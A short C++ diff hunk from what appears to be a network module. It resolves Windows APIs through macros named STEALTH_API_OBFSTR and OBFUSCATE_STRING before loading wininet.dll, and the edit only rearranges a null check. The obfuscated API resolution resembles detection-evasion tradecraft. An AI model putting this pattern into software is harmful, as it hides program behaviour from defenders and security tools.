@@ -87,14 +87,13 @@ namespace k8_NetworkingAPIs
                 pLoadLibraryA = reinterpret_cast<LoadLibraryA_t>(
                     STEALTH_API_OBFSTR("kernel32.dll", "LoadLibraryA")
                 );
-
-                if (!pLoadLibraryA) {
-                    return;
-                }
-
                 pGetLastError = reinterpret_cast<GetLastError_t>(
                     STEALTH_API_OBFSTR("kernel32.dll", "GetLastError")
                 );
+
+                if (!pLoadLibraryA || !pGetLastError) {
+                    return;
+                }
 
                 HMODULE hWinINet = pLoadLibraryA(OBFUSCATE_STRING("wininet.dll").c_str());
                 if (!hWinINet) {
